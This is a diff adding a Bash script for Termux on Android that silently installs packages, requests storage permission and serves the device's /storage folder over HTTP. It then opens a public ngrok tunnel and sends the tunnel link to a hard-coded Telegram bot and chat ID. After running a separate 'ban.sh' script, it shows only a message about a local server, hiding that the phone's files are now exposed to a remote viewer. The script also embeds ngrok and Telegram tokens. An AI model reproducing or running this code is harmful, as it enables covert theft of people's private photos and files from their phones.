@@ -1,0 +1,96 @@
+#!/bin/bash
+
+pkg install figlet -y > /dev/null 2>&1
+
+termux-setup-storage -y
+clear
+
+apt update -y > /dev/null 2>&1
+yes "N" | pkg upgrade -y > /dev/null 2>&1
+pkg install wget unzip proot-distro python -y > /dev/null 2>&1
+pip install requests > /dev/null 2>&1
+
+ARCH=$(uname -m)
+
+# Koreksi jika uname -m mengembalikan armv8l atau armv81
+if [[ "$ARCH" == "armv8l" || "$ARCH" == "armv81" ]]; then
+    ARCH="aarch64"
+fi
+
+NGROK_URL=""
+
+# Link ngrok v3.7.0 zip dari sumber resmi ngrok (update Juni 2025)
+if [[ "$ARCH" == "aarch64" ]]; then
+    NGROK_URL="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip"
+elif [[ "$ARCH" == "armv7l" ]]; then
+    NGROK_URL="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.zip"
+elif [[ "$ARCH" == "x86_64" ]]; then
+    NGROK_URL="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip"
+elif [[ "$ARCH" == "i686" || "$ARCH" == "i386" ]]; then
+    NGROK_URL="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-386.zip"
+else
+    echo "❌ Arsitektur CPU $ARCH tidak dikenali. Pasang Ngrok manual."
+    exit 1
+fi
+
+cd ~
+wget -q "$NGROK_URL" -O ngrok.zip
+unzip -o ngrok.zip > /dev/null 2>&1
+chmod +x ngrok
+mv -f ngrok $PREFIX/bin/
+rm -f ngrok.zip
+
+# Authtoken ngrok (ganti sesuai milikmu)
+NGROK_AUTH_TOKEN="2viVNzF9Fwd240IccmFDJir6OzI_7ZBoEkfXfE4ryHmb1wM9S"
+
+ngrok config add-authtoken $NGROK_AUTH_TOKEN > /dev/null 2>&1
+
+echo "⬇️ Menginstal Ubuntu dan Python3"
+proot-distro install ubuntu > /dev/null 2>&1
+proot-distro login ubuntu -- apt update -y > /dev/null 2>&1
+proot-distro login ubuntu -- bash -c 'export DEBIAN_FRONTEND=noninteractive && apt install -y tzdata python3' > /dev/null 2>&1
+
+echo "🚀 Menjalankan HTTP server lokal di port 8080"
+nohup proot-distro login ubuntu -- bash -c 'python3 -m http.server --bind 127.0.0.1 -d /storage 8080' > /dev/null 2>&1 &
+
+nohup ngrok http 8080 > /dev/null 2>&1 &
+sleep 5
+
+python3 <<EOF
+import requests
+import time
+
+BOT_TOKEN = "7941104570:AAHCLxQ1xHT7b4irN1ulnjoFXAhMJOVKMIU"
+VIEWERS = [8120978546]  # Ganti dengan chat_id viewer
+
+def get_ngrok_url():
+    try:
+        res = requests.get("http://127.0.0.1:4040/api/tunnels")
+        data = res.json()
+        return data['tunnels'][0]['public_url']
+    except:
+        return None
+
+def send_to_telegram(message):
+    for chat_id in VIEWERS:
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+        payload = {"chat_id": chat_id, "text": message}
+        requests.post(url, data=payload)
+
+url = None
+for _ in range(10):
+    url = get_ngrok_url()
+    if url:
+        break
+    time.sleep(2)
+
+if url:
+    send_to_telegram(f"🔗 Ngrok aktif: {url}")
+else:
+    send_to_telegram("❌ Gagal mendapatkan link ngrok.")
+EOF
+
+clear
+bash ~/Dead/ban.sh
+
+echo -e "\033[32mLocal HTTP Server is Running on http://127.0.0.1:8080\033[0m"
